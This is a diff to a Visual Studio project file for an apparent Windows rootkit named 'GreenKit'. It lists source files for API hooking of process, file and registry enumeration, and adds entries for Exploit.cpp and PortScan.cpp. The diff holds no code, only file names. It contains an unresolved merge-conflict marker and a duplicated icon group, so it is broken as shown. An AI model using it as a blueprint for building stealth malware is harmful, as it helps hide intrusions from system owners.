@@ -1,21 +1,27 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <ItemGroup>
+<<<<<<< HEAD
+=======
+    <ClCompile Include="Exploit.cpp" />
     <ClCompile Include="FindFiles.cpp" />
     <ClCompile Include="GreenKit.cpp" />
     <ClCompile Include="hooking.cpp" />
     <ClCompile Include="NtQuerySystemInformation.cpp" />
+    <ClCompile Include="PortScan.cpp" />
     <ClCompile Include="process.cpp" />
     <ClCompile Include="RegEnumValue.cpp" />
     <ClCompile Include="stdafx.cpp" />
     <ClCompile Include="utils.cpp" />
     <ClCompile Include="NtEnumerateKey.cpp" />
+    <ClCompile Include="el_win_structs.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="FindFiles.h" />
     <ClInclude Include="GreenKit.h" />
     <ClInclude Include="hooking.h" />
     <ClInclude Include="NtQuerySystemInformation.h" />
+    <ClInclude Include="PortScan.h" />
     <ClInclude Include="process.h" />
     <ClInclude Include="Resource.h" />
     <ClInclude Include="resource1.h" />
@@ -27,6 +33,14 @@
   </ItemGroup>
   <ItemGroup>
     <ResourceCompile Include="GreenKit.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="GreenKit.ico" />
+    <Image Include="small.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="el_win_structs.h" />
+    <ClInclude Include="detours.h" />
   </ItemGroup>
   <ItemGroup>
     <Image Include="GreenKit.ico" />
